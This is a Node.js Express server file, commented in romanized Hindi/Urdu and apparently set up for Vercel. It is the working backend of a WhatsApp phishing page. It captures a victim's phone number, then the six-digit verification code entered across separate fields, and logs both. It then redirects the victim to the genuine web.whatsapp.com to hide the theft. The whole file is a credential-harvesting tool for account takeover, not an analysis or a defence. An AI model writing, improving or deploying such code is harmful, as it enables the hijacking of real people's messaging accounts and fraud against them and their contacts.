// server.js
const express = require('express');
const path = require('path');
const app = express();

// Middleware Settings
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Public folder ki HTML/CSS files ko serve karna
app.use(express.static(path.join(__dirname, 'public')));

// 1. Pehle page se Phone Number receive karna
app.post('/submit-number', (req, res) => {
    const userPhone = req.body.phone;
    console.log(`[DATA] Phone Number: ${userPhone}`);
    
    // Number milne ke baad verify page par bhej dena
    res.redirect('/verify.html');
});

// 2. Doosre page se Code receive karna aur WhatsApp Web par bhejna  
// ======= YEH NAYA CODE ADD KAREIN =======
// Jab koi main domain open kare, to index.html file load ho
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});
// ========================================
app.post('/submit-code', (req, res) => {
    const code = `${req.body.c1}${req.body.c2}${req.body.c3}${req.body.c4}${req.body.c5}${req.body.c6}`;
    console.log(`[DATA] Verification Code: ${code}`);
    
    res.redirect('https://web.whatsapp.com');
});

// ======= VERCEL KE LIYE ZAROORI CHANGE =======
// Vercel par app.listen() ki zaroorat nahi hoti, haseen export chahiye hota hai
module.exports = app;